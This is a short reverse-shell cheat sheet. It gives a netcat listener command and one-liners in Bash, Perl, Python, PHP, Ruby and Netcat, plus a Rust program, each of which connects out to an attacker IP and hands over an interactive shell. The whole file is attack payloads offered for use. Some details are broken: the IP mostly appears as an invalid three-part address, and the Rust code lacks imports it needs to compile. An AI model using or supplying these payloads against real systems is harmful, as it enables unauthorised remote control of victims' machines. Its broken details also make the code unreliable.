# The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.
# Therefore in all f these cases you need to listen for port 8080 using the foolowing command
nc -vv -l -p 8080


# BASH
bash -i >& /dev/tcp/10.20.14.203/8080 0>&1

# PERL
perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("10.20.14",8080);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat
nc -e /bin/sh 10.20.14 8080

# RUST
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};

fn main() -> io::Result<()> {
    // Connect to the remote TCP server
    let mut stream = TcpStream::connect("10.20.14:8080")?;

    // Get the raw file descriptor
    let fd = stream.as_raw_fd();

    // Spawn a new shell process
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()?
        .wait()?;

    Ok(())
}
